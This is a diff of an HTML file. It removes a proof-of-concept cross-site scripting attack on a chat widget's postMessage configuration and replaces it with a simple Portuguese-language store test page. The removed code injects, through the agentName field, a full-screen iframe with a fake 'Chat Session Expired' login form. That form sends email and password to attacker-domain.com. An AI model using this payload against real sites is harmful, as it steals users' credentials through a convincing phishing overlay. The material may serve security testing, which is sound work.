@@ -1,15 +1,25 @@
-<a href="#" id="poc">Explorar Chat Widget</a>
-<script>
-    document.getElementById('poc').onclick = function() {
-        const win = window.open('');
-        setTimeout(function() {
-            win.postMessage(JSON.stringify({
-                "type": "chat_config",
-                "config": {
-                    "agentName": "'><iframe id=chatPhish srcdoc='<head><meta http-equiv=\"Content-Security-Policy\" content=\"form-action https://attacker-domain.com; \"></head><body style=\"margin:0;background:#f8f9fa;font-family:Arial,sans-serif\"><div style=\"max-width:400px;margin:80px auto;padding:30px;background:white;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.15)\"><div style=\"text-align:center;margin-bottom:25px\"><h2 style=\"color:#2c3e50;margin:0 0 8px 0;font-size:24px\">Chat Session Expired</h2><p style=\"color:#7f8c8d;margin:0;font-size:14px\">Please authenticate to continue your conversation</p></div><form action=//attacker-domain.com/capture-chat target=_blank><input type=email name=u placeholder=\"Email address\" style=\"width:100%;padding:14px;margin:0 0 16px 0;border:1px solid #bdc3c7;border-radius:6px;box-sizing:border-box;font-size:14px;transition:border-color 0.3s\"><input type=password name=p placeholder=\"Password\" style=\"width:100%;padding:14px;margin:0 0 20px 0;border:1px solid #bdc3c7;border-radius:6px;box-sizing:border-box;font-size:14px;transition:border-color 0.3s\"><button type=submit style=\"width:100%;padding:14px;background:#3498db;color:white;border:none;border-radius:6px;cursor:pointer;font-size:16px;font-weight:600;transition:background-color 0.3s\">Continue Chat</button></form></div></body>'></iframe><script>document.getElementById('chatPhish').style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;background:rgba(0,0,0,0.85);z-index:999999';</script><div style='display:none",
-                    "companyId": "vulnerable"
-                }
-            }), '*');
-        }, 10000);
-    };
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loja Online</title>
+</head>
+<body>
+    <h1>Nossa Loja</h1>
+    
+    <!-- Widget de chat -->
+    <div id="chat-widget"></div>
+    <script src="test-bem-bobo-vai-pro-lixo.js"></script>
+    
+    <!-- Script de inicialização -->
+    <script>
+        // Configuração legítima
+        window.postMessage(JSON.stringify({
+            type: 'chat_config',
+            config: {
+                agentName: 'João',
+                companyId: 'loja123'
+            }
+        }), '*');
+    </script>
+</body>
+</html>
